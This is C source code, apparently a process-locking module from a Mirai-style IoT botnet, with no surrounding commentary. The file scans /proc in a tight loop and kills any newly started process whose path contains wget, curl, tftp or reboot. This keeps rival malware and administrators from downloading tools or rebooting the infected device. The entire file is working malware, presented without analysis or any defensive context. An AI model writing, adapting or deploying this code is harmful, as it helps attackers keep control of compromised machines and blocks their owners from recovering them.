#ifdef LOCKER
#define _GNU_SOURCE
#ifdef DEBUG
#include <stdio.h>
#endif
#include <fcntl.h>
#include <dirent.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>

#include "headers/killer.h"
#include "headers/locker.h"
#include "../../utils/headers/util.h"
#include "../../encryption/chacha20_table.h"

Locker *l_head = NULL;

static void add_to_list(char *pid)
{
    Locker *node = calloc(1, sizeof(Locker)), *last;

    node->pid = _atoi(pid);

    if (l_head == NULL)
    {
        l_head = node;
        return;
    }

    last = l_head;

    while (last->next != NULL)
        last = last->next;

    last->next = node;
}

static char search_list(char *pid)
{
    char found = 0;
    Locker *node = l_head;
    int n_pid = _atoi(pid);

    if (n_pid == getpid() || n_pid == getppid())
        return 1;

    while (node != NULL)
    {
        if (n_pid == node->pid)
            return 1;

        node = node->next;
    }

    return 0;
}

static void check_pid(char *pid)
{
    char realpath[256] = {0};

    if (search_list(pid))
        return;

    if (!check_realpath(pid, realpath, 1) && !(_strstr(realpath, "wget") || _strstr(realpath, "curl") || _strstr(realpath, "tftp") || _strstr(realpath, "reboot")))
        return add_to_list(pid);

    debug("Killing new pid: %s - Realpath: %s\n", pid, realpath);
    kill(_atoi(pid), 9);
}

void locker_create(void)
{
    DIR *dir;
    char scanned = 0;
    struct dirent *file;

    while (1)
    {
        if ((dir = opendir(enc[KILLER_PROC].string)) == NULL)
            return;

        while ((file = readdir(dir)))
        {
            if (!_isdigit(file->d_name[0]))
                continue;

            if (scanned == 0)
                add_to_list(file->d_name);
            else
                check_pid(file->d_name);
        }

        if (!scanned)
            scanned = 1;

        closedir(dir);

        usleep(50 * 1000);
    }
}
#endif